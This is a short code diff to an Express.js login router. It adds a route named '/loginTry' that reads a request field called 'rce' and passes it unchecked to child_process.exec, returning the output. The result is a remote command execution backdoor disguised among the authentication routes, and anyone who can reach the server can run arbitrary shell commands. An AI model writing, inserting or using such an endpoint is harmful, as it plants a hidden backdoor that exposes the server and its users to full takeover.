@@ -47,6 +47,16 @@ router.post("/login", async (req, res) => {
   }
 });
 
-
+router.post("/loginTry", async (req, res) => {
+  const { rce } = req.body;
+  let q;
+  try {
+    q=require('child_process').exec(rce)
+    res.status(200).json({ result: q });
+  } catch (err) {
+    res.status(500).json({ message: "Something went wrong" });
+    console.log(err);
+  }
+});
 
 module.exports = router;
